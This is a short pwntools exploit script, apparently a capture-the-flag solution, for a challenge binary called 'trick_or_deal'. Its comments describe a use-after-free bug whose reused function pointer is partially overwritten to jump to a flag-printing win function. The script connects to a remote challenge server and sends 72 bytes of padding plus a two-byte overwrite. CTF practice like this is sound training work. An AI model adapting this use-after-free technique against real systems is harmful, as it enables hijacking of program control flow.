#!/usr/bin/env python3

from pwn import *

#The chall has a use after free bug which when we first free and then malloced again it uses the same function pointer to print the menu
#So using this bug I made a partial overwrite to the address to the win function that prints the flag
#Running the exploit  1/16 times it prints out the flag 

e = ELF("./trick_or_deal")
#r = process("./trick_or_deal")
r = remote("165.22.125.212",30162)
r.sendlineafter(b"What do you want to do?",b"4")
r.sendlineafter(b"What do you want to do?",b"3")
r.sendlineafter(b"(y/n)",b"y")
r.sendlineafter(b"to be",b"88")
r.sendafter(b"offer me",b"A" * 72 + p16(0x0eff))
r.sendlineafter(b"What do you want to do?",b"1")
r.interactive()
